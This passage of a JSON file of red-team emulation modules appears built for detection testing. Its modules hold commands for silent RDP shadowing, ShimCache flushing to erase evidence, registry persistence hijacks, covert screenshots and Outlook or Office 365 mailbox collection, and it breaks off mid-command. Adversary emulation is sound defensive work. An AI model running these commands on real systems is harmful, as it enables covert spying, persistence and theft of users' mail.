      "description": "Microsoft Remote Desktop Protocol (RDP) supports a shadowing feature and RDP is available in all Windows Server Operating Systems and the business editions of end-user Windows versions.\nIn order to use the RDP shadowing feature, the Remote Desktop Services (TermService) service needs to be running (which it does by default), a rule needs to be enabled in the Windows Firewall and in case of stealth reasons, a setting needs to be configured to not prompt the user for permission when they are being shadowed.\nIn order to configure RDP shadowing session in a quiet mode.  The registry of a remote system can be updated using several protocols, depending on the accessible ports and configuration of the services listening on those ports. Our aim is to set the Shadow value in HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services on the remote machine to 2, which allows us to both view and control the session without the user being informed.\n[Reference](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)\nGet-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s | Invoke-CimMethod -MethodName Enable\nInvoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"shadow\"; uValue=[uint32]2} -CimSession $s",
        "elevation_required": true,
        "cleanup_command": "Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"} -CimSession $s\n"
      },
      "variables": [
        {
          "name": "server_name",
          "description": "The remote server that we need to shadow and have to do the registry modification.",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ac494fe5-81a4-4897-af42-e774cf005ecb",
      "module_name": "Setting Shadow key in Registry for RDP Shadowing"
    },
    {
      "index": 773,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "The ShimCache is a component in Windows operating systems that stores information about recently executed applications. It is used by the operating system to speed up the launching process of applications. The ShimCache is also used by IR teams and Forensic teams. Forensic investigators can use the ShimCache to determine which programs have been executed on a system, even if they have been deleted or their logs have been cleared.Reference : https://blueteamops.medium.com/shimcache-flush-89daff28d15e",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "Rundll32.exe apphelp.dll,ShimFlushCache",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ecbd533e-b45d-4239-aeff-b857c6f6d68b",
      "module_name": "Flush Shimcache"
    },
    {
      "index": 774,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the machine to disable remote desktop protocol.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5f8e36de-37ca-455e-b054-a2584f043c06",
      "module_name": "Disable Windows Remote Desktop Protocol"
    },
    {
      "index": 775,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Enforce Smart Card Authentication Through Registry\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v scforceoption /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v scforceoption /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4c4bf587-fe7f-448f-ba8d-1ecec9db88be",
      "module_name": "Enforce Smart Card Authentication Through Registry"
    },
    {
      "index": 776,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Requires the BitLocker PIN for Pre-boot authentication\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseAdvancedStartup /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseAdvancedStartup /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "26fc7375-a551-4336-90d7-3f2817564304",
      "module_name": "Requires the BitLocker PIN for Pre-boot authentication"
    },
    {
      "index": 777,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Allow BitLocker without a compatible TPM (requires a password)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"\"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"\" /v EnableBDEWithNoTPM /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bacb3e73-8161-43a9-8204-a69fe0e4b482",
      "module_name": "Modify EnableBDEWithNoTPM Registry entry"
    },
    {
      "index": 778,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Use Trusted Platform Module (TPM) for Bitlocker tool\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPM /t REG_DWORD /d 2 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"\"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"\" /v UseTPM /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7c8c7bd8-0a5c-4514-a6a3-0814c5a98cf0",
      "module_name": "Modify UseTPM Registry entry"
    },
    {
      "index": 779,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Allow startup PIN with TPM for Bitlocker tool\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMPIN /t REG_DWORD /d 2 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMPIN /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "10b33fb0-c58b-44cd-8599-b6da5ad6384c",
      "module_name": "Modify UseTPMPIN Registry entry"
    },
    {
      "index": 780,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Allow startup key with TPM for Bitlocker tool\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /t REG_DWORD /d 2 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c8480c83-a932-446e-a919-06a1fd1e512a",
      "module_name": "Modify UseTPMKey Registry entry"
    },
    {
      "index": 781,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Allow startup key and PIN with TPM for Bitlocker tool\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "02d8b9f7-1a51-4011-8901-2d55cca667f9",
      "module_name": "Modify UseTPMKeyPIN Registry entry"
    },
    {
      "index": 782,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Allow Bitlocker without TPM for Bitlocker tool\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e672a340-a933-447c-954c-d68db38a09b1",
      "module_name": "Modify EnableNonTPM Registry entry"
    },
    {
      "index": 783,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Allow startup key with TPM for Bitlocker tool\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b5169fd5-85c8-4b2c-a9b6-64cc0b9febef",
      "module_name": "Modify UsePartialEncryptionKey Registry entry"
    },
    {
      "index": 784,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Allow startup PIN with TPM for Bitlocker tool\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /t REG_DWORD /d 2 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3ac0b30f-532f-43c6-8f01-fb657aaed7e4",
      "module_name": "Modify UsePIN Registry entry"
    },
    {
      "index": 785,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "The Windows Compatibility Telemetry system makes use of the CompatTelRunner.exe binary to run a variety of telemetry tasks. It relies on the registry for instructions on which commands to run. \nIt will run any arbitrary command without restriction of location or type. Blog :https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\#{new_key}\" /t REG_SZ /v Command /d #{new_executable} /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\#{new_key}\" /f\n"
      },
      "variables": [
        {
          "name": "new_key",
          "description": "New Registry Key Added",
          "type": "string",
          "default_value": "NewKey"
        },
        {
          "name": "new_executable",
          "description": "Custom Executable to run",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4469192c-2d2d-4a3a-9758-1f31d937a92b",
      "module_name": "Abusing Windows TelemetryController Registry Key for Persistence"
    },
    {
      "index": 786,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "If the fInheritInitialProgram value is set to 1, the exe indicated in the InitialProgram value is automatically started on RDP connection.\nOnce the test commands are run, notepad will execute automatically on new RDP connection\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v fInheritInitialProgram /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v InitialProgram /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v InitialProgram /t REG_SZ /d \"\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c691cee2-8d17-4395-b22f-00644c7f1c2d",
      "module_name": "Modify RDP-Tcp Initial Program Registry Entry"
    },
    {
      "index": 787,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /d \"%SystemRoot%\\System32\\cleanmgr.exe /D %c\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f2915249-4485-42e2-96b7-9bf34328d497",
      "module_name": "Abusing MyComputer Disk Cleanup Path for Persistence"
    },
    {
      "index": 788,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\dfrgui.exe\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3235aafe-b49d-451b-a1f1-d979fa65ddaf",
      "module_name": "Abusing MyComputer Disk Fragmentation Path for Persistence"
    },
    {
      "index": 789,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%SystemRoot%\\system32\\sdclt.exe\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "599f3b5c-0323-44ed-bb63-4551623bf675",
      "module_name": "Abusing MyComputer Disk Backup Path for Persistence"
    },
    {
      "index": 790,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "As per Microsoft,the entries found under App Paths are used primarily to map an applications executable file name to that files fully qualified path and to pre-pend information to the PATH environment variable on a per-application, per-process basis. \nThe path can be modified to load a custom application of choice. \nPost the registry changes of this test, when someone tries to manually run msedge.exe via StartMenu/Run window , notepad will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /t REG_SZ /d #{new_path} /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /v (Default) /f\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /t REG_SZ /d \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" /f\n"
      },
      "variables": [
        {
          "name": "app_name",
          "description": "path of application to be modified",
          "type": "string",
          "default_value": "msedge.exe"
        },
        {
          "name": "new_path",
          "description": "New App Path Added",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "573d15da-c34e-4c59-a7d2-18f20d92dfa3",
      "module_name": "Adding custom paths for application execution"
    },
    {
      "index": 791,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Use screencapture command to collect a full desktop screenshot\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "screencapture #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file path",
          "type": "path",
          "default_value": "/tmp/T1113_desktop.png"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0f47ceb1-720f-4275-96b8-21f0562217ac",
      "module_name": "Screencapture"
    },
    {
      "index": 792,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Use screencapture command to collect a full desktop screenshot\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "screencapture -x #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file path",
          "type": "path",
          "default_value": "/tmp/T1113_desktop.png"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "deb7d358-5fbd-4dc4-aecc-ee0054d2d9a4",
      "module_name": "Screencapture (silent)"
    },
    {
      "index": 793,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file path",
          "type": "path",
          "default_value": "/tmp/T1113_desktop.xwd"
        },
        {
          "name": "package_checker",
          "description": "Package checking command for linux. Debian system command- dpkg -s x11-apps",
          "type": "string",
          "default_value": "rpm -q xorg-x11-apps"
        },
        {
          "name": "package_installer",
          "description": "Package installer command for linux. Debian system command- apt-get install x11-apps",
          "type": "string",
          "default_value": "yum install -y xorg-x11-apps"
        }
      ],
      "prerequisites": [
        {
          "description": "Package with XWD and XWUD must exist on device\n",
          "check_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
          "install_command": "sudo #{package_installer} \n"
        }
      ],
      "rx_module_id": "8206dd0c-faf6-4d74-ba13-7fbe13dce6ac",
      "module_name": "X Windows Capture"
    },
    {
      "index": 794,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file path",
          "type": "path",
          "default_value": "/tmp/T1113_desktop.xwd"
        }
      ],
      "prerequisites": [
        {
          "description": "Package with XWD and XWUD must exist on device\n",
          "check_command": "if [ -x \"$(command -v xwd)\" ]; then exit 0; else exit 1; fi\nif [ -x \"$(command -v xwud)\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "pkg install -y xwd xwud \n"
        }
      ],
      "rx_module_id": "562f3bc2-74e8-46c5-95c7-0e01f9ccc65c",
      "module_name": "X Windows Capture (freebsd)"
    },
    {
      "index": 795,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Use import command from ImageMagick to collect a full desktop screenshot\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "import -window root #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file path",
          "type": "path",
          "default_value": "/tmp/T1113_desktop.png"
        }
      ],
      "prerequisites": [
        {
          "description": "ImageMagick must be installed\n",
          "check_command": "if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "sudo apt install graphicsmagick-imagemagick-compat\n"
        }
      ],
      "rx_module_id": "9cd1cccb-91e4-4550-9139-e20a586fcea1",
      "module_name": "Capture Linux Desktop using Import Tool"
    },
    {
      "index": 796,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Use import command from ImageMagick to collect a full desktop screenshot\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "import -window root #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file path",
          "type": "path",
          "default_value": "/tmp/T1113_desktop.png"
        }
      ],
      "prerequisites": [
        {
          "description": "ImageMagick must be installed\n",
          "check_command": "if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "pkg install -y ImageMagick7\n"
        }
      ],
      "rx_module_id": "18397d87-38aa-4443-a098-8a48a8ca5d8d",
      "module_name": "Capture Linux Desktop using Import Tool (freebsd)"
    },
    {
      "index": 797,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;\n[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c \"timeout #{recording_time} > NULL && psr.exe /stop\"\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file path",
          "type": "path",
          "default_value": "c:\\temp\\T1113_desktop.zip"
        },
        {
          "name": "recording_time",
          "description": "Time to take screenshots",
          "type": "integer",
          "default_value": 5
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3c898f62-626c-47d5-aad2-6de873d69153",
      "module_name": "Windows Screencapture"
    },
    {
      "index": 798,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"#{output_file}\")\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "$env:TEMP\\T1113.png"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e9313014-985a-48ef-80d9-cde604ffc187",
      "module_name": "Windows Screen Capture (CopyFromScreen)"
    },
    {
      "index": 799,
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "description": "Detects the enabling of the Windows Recall feature via registry manipulation. Windows Recall can be enabled by deleting the existing \"DisableAIDataAnalysis\" registry value. Adversaries may enable Windows Recall as part of post-exploitation discovery and collection activities. This rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary. \n- https://learn.microsoft.com/en-us/windows/client-management/manage-recall\n- https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowsai#disableaidataanalysis",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5a496325-0115-4274-8eb9-755b649ad0fb",
      "module_name": "Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted"
    },
    {
      "index": 800,
      "technique_id": "T1114.001",
      "technique_name": "Email Collection: Local Email Collection",
      "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "powershell -executionpolicy bypass -command \"#{file_path}\\Get-Inbox.ps1\" -file #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{output_file} -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file path",
          "type": "string",
          "default_value": "$env:TEMP\\mail.csv"
        },
        {
          "name": "file_path",
          "description": "File path for Get-Inbox.ps1",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1114.001\\src"
        }
      ],
      "prerequisites": [
        {
          "description": "Get-Inbox.ps1 must be located at #{file_path}\n",
          "check_command": "if (Test-Path \"#{file_path}\\Get-Inbox.ps1\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1114.001/src/Get-Inbox.ps1\" -OutFile \"#{file_path}\\Get-Inbox.ps1\"\n"
        }
      ],
      "rx_module_id": "3f1b5096-0139-4736-9b78-19bcb02bb1cb",
      "module_name": "Email Collection with PowerShell Get-Inbox"
    },
    {
      "index": 801,
      "technique_id": "T1114.002",
      "technique_name": "Email Collection: Remote Email Collection",
      "description": "Create and register an entra application that downloads emails from a tenant's Office 365 mailboxes using the Microsoft Graph API app-only access. This can be used by an adversary to collect an organization's sensitive information. \n",
      "execution": {
        "platforms": [
          "office-365"
        ],
        "executor_type": "powershell",
        "command": "$ss = ConvertTo-SecureString \"#{password}\" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\"; \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\"; \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\"; \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\"; \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\"; \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\"; \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 RX Module #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\"; Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \"#{1st_target_mailbox}\"\n$mailbox2 = \"#{2nd_target_mailbox}\"\n$mailbox3 = \"#{3rd_target_mailbox}\"\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail 